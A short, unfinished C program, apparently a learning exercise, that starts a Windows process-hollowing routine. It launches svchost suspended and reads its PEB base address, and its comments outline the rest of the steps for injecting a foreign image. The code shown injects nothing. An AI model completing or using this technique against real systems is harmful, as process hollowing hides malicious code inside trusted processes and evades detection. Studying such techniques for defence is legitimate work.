//idea from https://github.com/m0n0ph1/Process-Hollowing
#include <windows.h>
#include <stdio.h>
#include "internals.h"

int main(int argc, char* argv[]){
    //first create a process in suspended state
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    if(!CreateProcessA(
        NULL,
        "svchost", // let's use svchost as our process
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi)){
        printf("[!] Error creating process %d\n", GetLastError());
        return 1;
    }
    //load ntdll
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC fpNtQueryInformationProcess = GetProcAddress(ntdll, "NtQueryInformationProcess");
    _NtQueryInformationProcess ntQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
    //find the base address from the PEB block
    PROCESS_BASIC_INFORMATION pbi;
    DWORD returnLength = 0;
    NTSTATUS status;
    status = ntQueryInformationProcess(
        pi.hProcess, 
        0, 
        &pbi, 
        sizeof(PROCESS_BASIC_INFORMATION), 
        &returnLength);
    if(status != 0){
        printf("[!] Error querying process information: %x", status);
        return 1;
    }
    PEB peb;
    if(!ReadProcessMemory(
        pi.hProcess,
        (LPCVOID)pbi.PebBaseAddress,
        &peb,
        sizeof(PEB),
        0
    )){
        printf("[!] Error reading process memory: %d", GetLastError());
        return 1;
    }
    printf("base address: %x\n", peb.ImageBaseAddress);
    //read the NT headers
    //unmap destination section with NtUnmapViewOfSection
    //allocate memory for new image with virtuallocex, 
    //the image base stored must be set to the destination image base address
    //the optional header needs to be patched
    //copy the image with writeprocessmemory
    
    //rebase the source image with the .reloc section, IMAGE_DATA_DIRECTORY (IMAGE_DIRECTORY_ENTRY_BASERELOC)
    //with the source image loaded into the target process, update EAX register with the thread context
    //resume the thread
    return 0;
}
